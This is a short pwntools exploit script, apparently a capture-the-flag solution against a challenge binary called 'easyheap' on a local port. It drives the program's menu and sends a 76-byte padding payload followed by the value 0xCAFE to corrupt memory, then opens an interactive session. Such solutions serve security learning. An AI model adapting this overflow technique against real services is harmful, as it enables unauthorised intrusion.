#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 40012 ../easyheap/service/share/easyheap
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('../easyheap/service/share/easyheap')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 40012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

p = start()

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)

print(ru(b"7)[e]->exit\n").decode())
sl(b"r")
sl(b"qqqq")
sl(b"qqqq")
sl(b"qqqq")

print(ru(b"7)[e]->exit\n").decode())
sl(b"r")
sl(b"wwww")
sl(b"wwww")
sl(b"wwww")

print(ru(b"7)[e]->exit\n").decode())
sl(b"i")
sl(b"0")
sl(b"qqqq")

print(ru(b"7)[e]->exit\n").decode())
sl(b"c")
sl(b"xxxx")
sl(b"xxxx")
sl(b"p" * 76 + p32(0xCAFE))

print(ru(b"7)[e]->exit\n").decode())
sl(b"o")

print(ru(b"7)[e]->exit\n").decode())
sl(b"i")
sl(b"1")
sl(b"wwww")

print(ru(b"7)[e]->exit\n").decode())
sl(b"s")


p.interactive()
